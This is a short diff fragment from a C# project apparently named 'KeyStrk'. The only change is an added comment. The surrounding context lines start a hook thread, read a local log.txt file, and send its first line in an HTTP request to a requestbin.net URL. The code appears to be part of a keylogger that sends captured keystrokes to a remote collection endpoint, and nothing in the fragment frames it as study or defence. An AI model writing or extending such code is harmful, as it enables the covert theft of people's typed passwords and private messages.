@@ -36,6 +36,8 @@ namespace KeyStrk
             // Thread sendData = new Thread(sendThread);
 
             hookThread.Start();
+            
+           // used for sending data over http request to a remote server
             StreamReader sr = new StreamReader(Application.StartupPath + @"\log.txt");
             HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/tzdsaytz?" + sr.ReadLine());
             sr.Close();
